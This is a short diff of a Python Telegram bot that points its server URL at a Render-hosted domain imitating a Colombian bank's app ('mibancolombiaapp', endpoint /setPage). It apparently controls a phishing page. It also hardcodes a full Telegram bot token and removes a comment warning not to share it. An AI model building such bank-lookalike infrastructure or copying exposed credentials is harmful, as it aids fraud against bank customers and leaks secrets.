@@ -2,12 +2,11 @@ import telebot
 import requests
 import time
 
-# Token de Telegram (¡no lo compartas públicamente!)
 TOKEN = "7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI"
 bot = telebot.TeleBot(TOKEN)
 
 # URL del servidor desplegado en Render
-SERVER_URL = "http://localhost:3000/setPage"
+SERVER_URL = "https://mibancolombiaapp.onrender.com/setPage"
 
 @bot.message_handler(commands=["start"])
 def send_welcome(message):
